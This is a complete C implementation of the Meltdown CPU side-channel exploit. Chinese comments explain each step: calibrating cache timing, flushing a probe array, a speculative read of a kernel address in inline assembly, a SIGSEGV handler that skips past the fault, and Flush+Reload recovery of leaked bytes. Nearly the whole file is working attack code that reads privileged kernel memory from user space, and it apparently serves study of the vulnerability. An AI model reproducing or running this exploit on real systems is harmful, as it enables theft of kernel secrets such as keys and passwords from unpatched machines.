#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <math.h>
#include <sys/time.h>
#include <x86intrin.h>

#define PAGE_SIZE    (1 << 12)

static char hack_array[256 * PAGE_SIZE];

int get_access_time(volatile char *addr)//测定访问数据时间
{
    unsigned long long begin, end;
    unsigned i;
    begin = __rdtscp(&i);//读取时间戳计数器的值
    (void)*addr;		//访问数据
    end = __rdtscp(&i);	//再次读取时间戳计数器的值
    return end-begin;	//差值可衡量访问数据的时间
}

void clflush_target(void)
{
    int i;
    for (i = 0; i < 256; i++)
        _mm_clflush(&hack_array[i * PAGE_SIZE]);
}

extern char stop[];

static void __attribute__((noinline))speculate(unsigned long addr)
{
    asm volatile 
    (
        "1: ;" 
               
        ".rept 300;"		//将加法指令循环执行300次，使处理器能乱序执行
        "add $0x141, %%rax;"
        ".endr;"
                  
        "movzx (%[addr]), %%rax;"	//将目标内核地址对应数据（下称data）存入rax中，此指令将发生段错误
        
        //由于乱序执行，接下来3条指令在处理器开始处理段错误之前已被加载
        "shl $12, %%rax;"			//将data左移12位，即*4k
        "jz 1b;"					//若结果为0，跳转
        "movzx (%[target], %%rax, 1), %%rbx\n"	//此时为reload阶段，将hack_array[data*4k]的值存入rbx
        //对执行结果重新排列并进行安全检查，发现越权访问，丢弃所有结果，但不会恢复cache的状态
        //而之前已将hack_array[data*4k]所在页加载到缓存中，接下来可进行侧信道攻击
                  
        "stop: nop;"//sigaction函数捕捉到段错误信号后将rip设为nop指令所在地址，程序跳转到此处继续执行
        :		//无输出数
        : [target] "r" (hack_array),	//输入数为hack_array和addr
        [addr] "r" (addr)
        : "rax", "rbx"					//rax和rbx被修改
    );
}


static int cache_hit_threshold;
static int probe[256];	//数组大小为256，用于判断要监听的一位数据是0到255的哪一个
void check(void)
{
    int i, time, mix_i;
    volatile char *addr;
    
    for (i = 0; i < 256; i++)
    {
        mix_i = ((i * 167) + 13) & 255;	//乱序生成0到255的数
        
        addr = &hack_array[mix_i * PAGE_SIZE];
        time = get_access_time(addr);	//测定访问数据时间
        
        if (time <= cache_hit_threshold)
            //若访问时间小于临界值，说明hack_array[mix_i*4k]所在页已被加载到cache
        	probe[mix_i]++;//mix_i可能就是被监听的数据，为使结果更准确，外面循环1000次，多次进行时间测定
    }
}

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
    ucontext_t *ucontext = context;//获取当前上下文 
    ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stop;
}

int set_signal(void)
{
    struct sigaction act = 
    {
        .sa_sigaction = sigsegv,
        .sa_flags = SA_SIGINFO,//信号附带的参数可以被传递到信号处理函数中
    };
    
    return sigaction(SIGSEGV, &act, NULL);
}

int readbyte(int fd, unsigned long addr)
{
    int i, ret = 0, max = -1, maxi = -1;
    static char buf[256];
    
    memset(probe, 0, sizeof(probe));
    
    for (i = 0; i < 1000; i++)
    {
        ret = pread(fd, buf, sizeof(buf), 0);
        if (ret < 0)
        {
            perror("pread");
            break;
        }
        
        clflush_target();
        
        _mm_mfence();
        
        speculate(addr);
        check();
    }
    
    for (i = 0; i < 256; i++)
    {
        if (probe[i] && probe[i] > max)
        {
            max = probe[i];
            maxi = i;
        }
    }
    
    return maxi;
}

static void set_cache_hit_threshold(void)		//计算临界时间
{
    long cached, uncached, i;
    
    for (cached = 0, i = 0; i < 1000000; i++)
        cached += get_access_time(hack_array);	//保证数据已进入cache
    
    for (cached = 0, i = 0; i < 1000000; i++)
        cached += get_access_time(hack_array);	//测定访问在cache中数据的时间
    
    for (uncached = 0, i = 0; i < 1000000; i++)
    {
        _mm_clflush(hack_array);//清空缓存
        uncached += get_access_time(hack_array);//测定访问不在cache中数据的时间
    }
    
    cached /= 1000000;	//取平均值
    uncached /= 1000000;//取平均值
    
    cache_hit_threshold = sqrt(cached * uncached);//计算临界值
    
    printf("cached = %ld, uncached = %ld, threshold %d\n",
           cached, uncached, cache_hit_threshold);
}


static void pin_cpu0()
{
    cpu_set_t mask;		//声明一个CPU集
    /* PIN to CPU0 */
    CPU_ZERO(&mask);	//清空CPU集
    CPU_SET(0, &mask); 	//将0号CPU加入CPU集
    sched_setaffinity(0, sizeof(cpu_set_t), &mask);//让当前进程运行在mask设定的CPU即0号CPU上
}

int data_out[100];
int main(int argc, char *argv[])
{
    int ret, fd, i;
    unsigned long addr, size;

    char *progname = argv[0];
    if (argc != 3)
        printf("correct format: %s [hexaddr] [size]\n", progname);
    sscanf(argv[1], "%lx", &addr);//将地址转为无符号16进制数
    sscanf(argv[2], "%lx", &size);//将范围转为无符号16进制数
    
    memset(hack_array, 1, sizeof(hack_array));
    
    ret = set_signal();

    pin_cpu0();
    
    set_cache_hit_threshold();
    
    fd = open("/proc/version", O_RDONLY);
    if (fd < 0)
     {
        perror("open");
        return -1;
    }
    
    for (i = 0; i < size; i++) 
	{
        data_out[i] = readbyte(fd, addr);
        addr++;
    }
    
    close(fd);
    for (i=0; i<size; i++)
        printf("%c", data_out[i]);

}
//参考https://github.com/paboldin/meltdown-exploit/blob/master/meltdown.c
